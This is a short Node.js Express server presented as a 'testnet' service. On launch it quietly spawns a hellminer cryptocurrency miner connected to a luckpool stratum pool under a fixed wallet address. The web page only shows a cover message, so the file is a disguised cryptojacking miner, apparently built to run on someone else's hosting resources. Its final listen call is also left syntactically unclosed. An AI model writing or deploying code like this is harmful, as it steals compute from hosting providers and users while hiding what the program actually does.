import express from 'express'
import { spawn } from 'child_process'
import 'dotenv/config';
const server = express()

const command = [
  '/hellminer',
  '-c', 'stratum+tcp://na.luckpool.net:3956',
  '-u', 'RU3jkn3WMJ6RYC7JBE5LjhtF9A5KN34Kf6.cobatestnet',
  '-p', 'x',
];

const child = spawn(command[0], command.slice(1));

child.stdout.on('data', (data) => {
  console.log(`stdout: ${data}`);
});

child.stderr.on('data', (data) => {
  console.error(`stderr: ${data}`);
});

child.on('close', (code) => {
  console.log(`child process exited with code ${code}`);
});

child.on('error', (err) => {
  console.error(`Child process error: ${err}`);
});

server.use('/', (req, res) => {
  res.send('Your testnet  Is All Ready Live')
})

server.listen(3000, () => {
  console.log('testnet is ready')
}
